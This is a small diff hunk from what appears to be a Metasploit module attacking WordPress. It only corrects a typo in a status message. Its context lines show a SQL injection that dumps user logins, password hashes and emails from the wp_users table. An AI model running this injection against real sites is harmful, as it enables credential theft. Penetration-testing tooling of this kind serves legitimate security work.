@@ -85,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
 
     credentials = ''
 
-    vprint_status("#{peer} - Trying to retrieve the users informations...")
+    vprint_status("#{peer} - Trying to retrieve the users information...")
     for user_id in first_id..last_id
       separator = Rex::Text.rand_text_numeric(7, bad = '0')
       user_info = send_sql_request("concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --")
